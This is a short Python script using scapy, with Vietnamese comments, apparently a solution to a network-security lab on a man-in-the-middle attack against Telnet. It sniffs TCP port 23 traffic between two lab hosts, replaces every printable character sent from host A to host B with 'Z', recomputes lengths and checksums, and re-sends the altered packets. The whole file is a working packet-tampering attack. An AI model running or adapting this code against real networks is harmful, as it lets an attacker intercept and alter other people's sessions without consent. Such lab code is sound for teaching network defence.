
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_M = get_if_hwaddr("eth0")

def spoof_pkt(pkt):
    if IP not in pkt or TCP not in pkt:
        return

    src = pkt[IP].src
    dst = pkt[IP].dst

    if not ((src == IP_A and dst == IP_B) or
            (src == IP_B and dst == IP_A)):
        return

    newpkt = IP(bytes(pkt[IP]))

    if src == IP_A and dst == IP_B and Raw in newpkt:
        data = bytes(newpkt[Raw].load)

        # Thay ky tu in duoc thanh Z,
        # giu nguyen cac ky tu dieu khien Telnet.
        newdata = bytes(
            90 if 32 <= b <= 126 else b
            for b in data
        )

        newpkt[Raw].load = newdata

        if data != newdata:
            print(f"A -> B: {data!r} => {newdata!r}",
                  flush=True)

    # Tinh lai do dai va checksum
    del newpkt.len
    del newpkt.chksum
    del newpkt[TCP].chksum

    send(newpkt, verbose=False)

# Khong bat lai cac goi do Host M tao ra
bpf = f"tcp port 23 and not ether src {MAC_M}"

print("Bat dau MITM Telnet...", flush=True)
sniff(iface="eth0", filter=bpf,
      prn=spoof_pkt, store=False)
